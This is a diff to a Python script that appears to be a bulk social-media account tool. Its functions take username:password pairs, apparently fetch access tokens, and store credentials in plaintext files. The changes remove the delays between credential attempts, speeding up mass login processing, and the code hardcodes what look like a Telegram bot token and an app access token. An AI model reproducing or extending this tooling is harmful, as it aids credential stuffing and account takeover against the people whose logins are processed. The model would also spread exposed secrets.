@@ -1126,12 +1126,12 @@ def token_getter():
         remove_processed_ids([user])
 
         
-        print(f"{y}Waiting for 3 seconds before processing the next credentials...")
-        time.sleep(3)
+        print(f"{y}Waiting for 0 seconds before processing the next credentials...")
+        time.sleep(0)
 
         
-        print(f"{g}Returning to the main menu in 2 seconds...")
-        time.sleep(2)  
+        print(f"{g}Returning to the main menu in 0 seconds...")
+        time.sleep(0)  
         
 
 def datr(user, passw):
@@ -1184,7 +1184,7 @@ def datr(user, passw):
             success_file.write(f"{user}:{passw}\n")
             
         
-        time.sleep(5)  
+        time.sleep(1)  
     else:
         clear()
         print(f"{r}Invalid Username Or Password")
@@ -1196,7 +1196,7 @@ def datr(user, passw):
             errorpage_file.write(f"{user}:{passw}\n")
         print(f"{r}Invalid token saved to /sdcard/RFCPTOOLS/tokens/error.txt")
         print(f"{g}Returning to the main menu in 2 seconds...")
-        time.sleep(2)  
+        time.sleep(0)  
 HELLO_TOKEN = '7391186730:AAGp31Olg5hywWrLZdMPphE1U7MGMWRFM3c'
 def cuser(user, passw):
     accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1277,8 +1277,8 @@ def cuser(user, passw):
             errorpage_file.write(f"{user}:{passw}\n")
         print(f"{r}Invalid token saved to /sdcard/RFCPTOOLS/tokens/error.txt")
         
-        print(f"{c}Returning to the main menu in 2 seconds...")
-        time.sleep(2)  # Simulate delay before returning to the main menu
+        print(f"{c}Returning to the main menu in 0 seconds...")
+        time.sleep(0)  # Simulate delay before returning to the main menu
 
 def save_user_token(token):
     with open("/sdcard/RFCPTOOLS/tokens/account/fraacount.txt", "a") as file:
@@ -1420,8 +1420,8 @@ def other_menu():
                 f"{Y}[5] {G}DESCRIPTION GUIDE\n"
                 f"{Y}[6] {G}UID GETTER\n"
                 f"{Y}[7] {G}DELETE TOKENS\n"
-                f"{Y}[8] {G}APPROVAL DETAILS\n"
-                f"{Y}[9] {G}APPROVAL TOOLS\n"
+        
+                f"{Y}[8] {G}APPROVAL TOOLS\n"
                 f"{Y}[0] {G}BACK\n",
                 title=f"{Y}Other Tools Menu",
                 border_style="bold yellow"))
@@ -1445,9 +1445,8 @@ def other_menu():
         	uid_main()
         elif choice =='7':
         	delete_tokens(tool_token())
+      
         elif choice =='8':
-             approval_details()
-        elif choice =='9':
             approval_tools()
         elif choice == '0':
             return
